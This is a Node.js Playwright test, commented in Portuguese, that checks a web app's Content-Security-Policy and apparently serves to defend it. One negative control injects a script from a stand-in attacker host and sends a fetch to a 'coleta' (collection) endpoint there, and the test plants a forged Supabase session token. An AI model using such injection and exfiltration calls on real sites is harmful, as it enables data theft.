// v18.50 — Content-Security-Policy (pagina/_headers), hoje em modo só relatório.
// Monta, numa pasta temporária, o que o netlify.toml publica (pagina/ na raiz e o app em /app/),
// serve em localhost com a política VALENDO (mais rígido que o modo relatório) e, SEM rede, com
// as bibliotecas de robo/libs_locais e o Supabase respondendo o mínimo, prova:
//   C1  o _headers tem a política em modo relatório para todas as páginas, com as diretivas certas;
//   C2  /, /professor/ e /aluno/ abrem sem nenhuma violação (scripts, estilos, fontes, imagens e vídeos);
//   C3  o app (/app/) abre, carrega as 4 bibliotecas e exporta PDF e Word sem nenhuma violação;
//   C4  controle: sem o CDN do supabase-js na lista, a política acusa a violação (o teste enxerga);
//   C5  controle: um script de outro site e uma conexão com outro site são acusados.
// A geração completa (login, questões com imagem, tabela e gráfico, PDF e Word) com a política
// valendo é conferida por: node robo/teste_local.mjs --csp
//
// Uso: node tests/verify_csp_v1850.js
const { chromium } = require('playwright');
const fs = require('fs'), os = require('os'), path = require('path'), http = require('http');

const RAIZ = path.resolve(__dirname, '..');
const LIBS = path.join(RAIZ, 'robo', 'libs_locais');
const headers = fs.readFileSync(path.join(RAIZ, 'pagina', '_headers'), 'utf8');
const CSP = (headers.match(/^\s*Content-Security-Policy-Report-Only:\s*(.+)$/m) || [])[1];

const resultados = [];
const chk = (ok, msg) => resultados.push([!!ok, msg]);

const DIST = fs.mkdtempSync(path.join(os.tmpdir(), 'dist-csp-'));
fs.cpSync(path.join(RAIZ, 'pagina'), DIST, { recursive: true, dereference: true });
fs.mkdirSync(path.join(DIST, 'app'));
fs.copyFileSync(path.join(RAIZ, 'index.html'), path.join(DIST, 'app', 'index.html'));
const TIPOS = { '.html': 'text/html; charset=utf-8', '.js': 'application/javascript', '.css': 'text/css', '.webp': 'image/webp', '.jpg': 'image/jpeg', '.png': 'image/png', '.mp4': 'video/mp4', '.webm': 'video/webm', '.svg': 'image/svg+xml' };
let politica = CSP;
const servidor = http.createServer((req, res) => {
  let p = decodeURIComponent(new URL(req.url, 'http://x').pathname);
  if (p.endsWith('/')) p += 'index.html';
  const f = path.join(DIST, p);
  if (!f.startsWith(DIST) || !fs.existsSync(f) || fs.statSync(f).isDirectory()) { res.writeHead(404); return res.end(); }
  res.writeHead(200, { 'content-type': TIPOS[path.extname(f)] || 'application/octet-stream', 'content-security-policy': politica });
  fs.createReadStream(f).pipe(res);
});
const LIB = (u) => /supabase-js/.test(u) ? 'supabase.js' : /Chart\.js/.test(u) ? 'chart.umd.js' : /jspdf/.test(u) ? 'jspdf.umd.min.js' : /docx@/.test(u) ? 'docx.umd.js' : null;

(async () => {
  // C1
  const dir = Object.fromEntries((CSP || '').split(';').map(s => s.trim()).filter(Boolean).map(s => { const [k, ...v] = s.split(/\s+/); return [k, v]; }));
  const bloco = headers.split(/\n(?=\S)/).find(b => /^\/\*\s*$/m.test(b.split('\n').find(l => !l.startsWith('#')) || ''));
  chk(CSP && bloco && bloco.includes('Content-Security-Policy-Report-Only:') && !/^\s*Content-Security-Policy:/m.test(headers),
    'C1a a política está no bloco /* (todas as páginas e o app) e em modo só relatório');
  chk(dir['default-src']?.join(' ') === "'self'" && dir['object-src']?.join(' ') === "'none'" && dir['base-uri']?.join(' ') === "'self'" &&
      dir['frame-ancestors']?.join(' ') === "'none'" && !(dir['script-src'] || []).includes("'unsafe-eval'") &&
      (dir['script-src'] || []).join(' ') === "'self' 'unsafe-inline' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com" &&
      (dir['connect-src'] || []).join(' ') === "'self' https://gkceyrkdmnhgqimmrsre.supabase.co wss://gkceyrkdmnhgqimmrsre.supabase.co",
    'C1b diretivas: scripts só do site e dos 2 CDNs, conexões só com o Supabase, sem eval, sem plugins, sem quadro');

  await new Promise(r => servidor.listen(0, '127.0.0.1', r));
  const BASE = 'http://127.0.0.1:' + servidor.address().port;
  const browser = await chromium.launch();
  async function abrir(caminho, extra) {
    const ctx = await browser.newContext({ acceptDownloads: true });
    await ctx.addInitScript(() => {
      // sessão falsa do supabase-js (o app manda quem chega sem login para /?entrar)
      const agora = Math.floor(Date.now() / 1000);
      const b64 = (o) => btoa(JSON.stringify(o)).replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_');
      const user = { id: 'u-teste', aud: 'authenticated', role: 'authenticated', email: 'teste@exemplo.local', app_metadata: {}, user_metadata: {} };
      const token = b64({ alg: 'HS256', typ: 'JWT' }) + '.' + b64({ sub: 'u-teste', aud: 'authenticated', role: 'authenticated', exp: agora + 3600 }) + '.x';
      try { localStorage.setItem('sb-gkceyrkdmnhgqimmrsre-auth-token', JSON.stringify({ access_token: token, refresh_token: 'r', token_type: 'bearer', expires_in: 3600, expires_at: agora + 3600, user })); } catch (e) {}
      window.__violacoes = [];
      document.addEventListener('securitypolicyviolation', e => window.__violacoes.push(`${e.effectiveDirective} ← ${e.blockedURI || '(inline)'}`));
    });
    await ctx.route('**/*', (r) => {
      const u = r.request().url();
      if (u.startsWith(BASE) || u.startsWith('data:') || u.startsWith('blob:')) return r.continue();
      const arq = LIB(u);
      if (arq) return r.fulfill({ status: 200, contentType: 'application/javascript', headers: { 'access-control-allow-origin': '*' }, body: fs.readFileSync(path.join(LIBS, arq)) });
      if (/supabase\.co\//.test(u)) {
        const cab = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': '*' };
        if (r.request().method() === 'OPTIONS') return r.fulfill({ status: 204, headers: cab });
        const corpo = /\/auth\/v1\/user/.test(u) ? { id: 'u-teste', aud: 'authenticated', role: 'authenticated', email: 'teste@exemplo.local' } : /\/rest\/v1\//.test(u) ? [] : {};
        return r.fulfill({ status: 200, contentType: 'application/json', headers: cab, body: JSON.stringify(corpo) });
      }
      if (/fonts\.(googleapis|gstatic)\.com/.test(u)) return r.fulfill({ status: 200, contentType: /googleapis/.test(u) ? 'text/css' : 'font/woff2', headers: { 'access-control-allow-origin': '*' }, body: '' });
      return r.fulfill({ status: 404, body: '' });
    });
    const p = await ctx.newPage();
    const erros = [];
    p.on('pageerror', e => erros.push(e.message));
    await p.goto(BASE + caminho); await p.waitForTimeout(1200);
    if (extra) await extra(p);
    const v = await p.evaluate(() => window.__violacoes);
    await ctx.close();
    return { v, erros };
  }

  // C2
  const pags = {};
  for (const c of ['/', '/professor/', '/aluno/']) pags[c] = await abrir(c);
  chk(Object.values(pags).every(r => r.v.length === 0), 'C2 as três páginas abrem sem violação ' + JSON.stringify(Object.fromEntries(Object.entries(pags).map(([k, r]) => [k, r.v.slice(0, 3)]))));

  // C3
  let exp = null;
  const app = await abrir('/app/', async (p) => {
    exp = await p.evaluate(async () => {
      const r = { supabase: typeof window.supabase?.createClient === 'function', chart: typeof window.Chart === 'function' };
      await loadScriptOnce(CDN_URLS.jspdf); await loadScriptOnce(CDN_URLS.docx);
      const doc = new window.jspdf.jsPDF(); doc.text('teste', 10, 10); r.pdf = doc.output('arraybuffer').byteLength > 500;
      const d = new window.docx.Document({ sections: [{ children: [new window.docx.Paragraph('teste')] }] });
      r.docx = (await window.docx.Packer.toBlob(d)).size > 500;
      const c = document.createElement('canvas'); document.body.appendChild(c);
      new Chart(c, { type: 'bar', data: { labels: ['a', 'b'], datasets: [{ data: [1, 2] }] }, options: { animation: false } });
      r.grafico = c.toDataURL().length > 1000;
      return r;
    });
  });
  chk(exp && exp.supabase && exp.chart && exp.pdf && exp.docx && exp.grafico && app.v.length === 0,
    `C3 o app abre, carrega as 4 bibliotecas, faz PDF, Word e gráfico sem violação (${JSON.stringify(exp)}; ${app.v.length} violação(ões)${app.v.length ? ': ' + app.v.slice(0, 3).join(' | ') : ''})`);

  // C4: controle negativo — o CDN do supabase-js fora da lista
  politica = CSP.replace(' https://cdn.jsdelivr.net', '');
  const neg = await abrir('/');
  chk(neg.v.some(x => /^script-src(-elem)? ← https:\/\/cdn\.jsdelivr\.net\//.test(x)), 'C4 controle: tirando o CDN da lista, a política acusa o supabase-js (' + neg.v.slice(0, 2).join(' | ') + ')');
  politica = CSP;

  // C5: controle negativo — script e conexão com outro site
  const fora = await abrir('/app/', async (p) => {
    await p.evaluate(async () => {
      const s = document.createElement('script'); s.src = 'https://exemplo-ataque.invalid/x.js'; document.head.appendChild(s);
      try { await fetch('https://exemplo-ataque.invalid/coleta?d=1'); } catch (e) {}
    });
    await p.waitForTimeout(300);
  });
  chk(fora.v.some(x => /^script-src(-elem)? ← https:\/\/exemplo-ataque\.invalid/.test(x)) && fora.v.some(x => /^connect-src ← https:\/\/exemplo-ataque\.invalid/.test(x)),
    'C5 controle: script e envio de dados para outro site são acusados (' + fora.v.join(' | ') + ')');

  await browser.close(); servidor.close();
  for (const [ok, msg] of resultados) console.log((ok ? 'PASS ' : 'FAIL ') + msg);
  const falhas = resultados.filter(r => !r[0]).length;
  console.log(`\n${resultados.length - falhas} verificações passaram, ${falhas} falharam`);
  process.exit(falhas ? 1 : 0);
})().catch(e => { console.error(e); process.exit(1); });
